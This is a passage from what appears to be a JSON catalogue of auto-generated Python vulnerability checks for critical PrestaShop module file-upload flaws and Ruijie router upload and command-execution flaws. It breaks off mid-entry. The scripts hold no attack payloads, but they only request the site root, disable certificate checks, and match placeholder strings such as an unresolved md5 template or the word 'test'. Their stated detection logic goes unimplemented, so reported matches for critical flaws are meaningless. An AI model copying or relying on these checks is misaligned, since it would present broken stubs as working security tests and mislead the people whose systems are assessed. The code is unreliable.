        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: prestashop-blocktestimonial-file-upload\nName: Prestashop Blocktestimonial Modules - File Upload Vulnerability\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_prestashop_blocktestimonial_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"prestashop-blocktestimonial-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Prestashop Blocktestimonial Modules - File Upload Vulnerability\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Your testimonial was submitted successfully.' | mot(s) '{{data}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['Your testimonial was submitted successfully.', '{{data}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Prestashop Blocktestimonial Modules - File Upload Vulnerability\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_prestashop_blocktestimonial_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "intrusive",
          "file-upload",
          "blocktestimonial",
          "prestashop",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_prestashop_cartabandonmentpro_file_upload",
        "name": "Prestashop Cart Abandonment Pro File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "",
        "severity": "critical",
        "detection": "[OR] DSL: contains(content_type, \"text/html\"); contains(body, \"{{filename}}.php.png\") / [OR] DSL: contains(content_type, \"image/png\"); contains(body, \"{{string}}\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(7, \"abc\")}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{rand_base(7, \"abc\")}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: prestashop-cartabandonmentpro-file-upload\nName: Prestashop Cart Abandonment Pro File Upload\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_prestashop_cartabandonmentpro_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"prestashop-cartabandonmentpro-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Prestashop Cart Abandonment Pro File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(content_type, \"text/html\"); contains(body, \"{{filename}}.php.png\") / [OR] DSL: contains(content_type, \"image/png\"); contains(body, \"{{string}}\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Prestashop Cart Abandonment Pro File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_prestashop_cartabandonmentpro_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: prestashop-cartabandonmentpro-file-upload\nName: Prestashop Cart Abandonment Pro File Upload\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_prestashop_cartabandonmentpro_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"prestashop-cartabandonmentpro-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Prestashop Cart Abandonment Pro File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(content_type, \"text/html\"); contains(body, \"{{filename}}.php.png\") / [OR] DSL: contains(content_type, \"image/png\"); contains(body, \"{{string}}\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Prestashop Cart Abandonment Pro File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_prestashop_cartabandonmentpro_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "intrusive",
          "file-upload",
          "cartabandonmentpro",
          "prestashop",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_ruijie_nbr_fileupload",
        "name": "Ruijie NBR fileupload.php - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.",
        "severity": "critical",
        "detection": "[OR] mot(s) '{{md5(string)}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "ruijie-nbr-fileupload"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ruijie-nbr-fileupload\nName: Ruijie NBR fileupload.php - Arbitrary File Upload\nSeverity: critical\nDescription: Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ruijie_nbr_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ruijie-nbr-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Ruijie NBR fileupload.php - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ruijie NBR fileupload.php - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ruijie_nbr_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ruijie-nbr-fileupload\nName: Ruijie NBR fileupload.php - Arbitrary File Upload\nSeverity: critical\nDescription: Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ruijie_nbr_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ruijie-nbr-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"Ruijie NBR fileupload.php - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ruijie NBR fileupload.php - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ruijie_nbr_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "ruijie",
          "fileupload",
          "intrusive",
          "nbr",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_ruijie_nmc_sync_rce",
        "name": "Ruijie RG-UAC nmc_sync.php - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(body_2, '{{match_str}}')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "random_str",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: random_str",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "match_str",
            "datatype": "string",
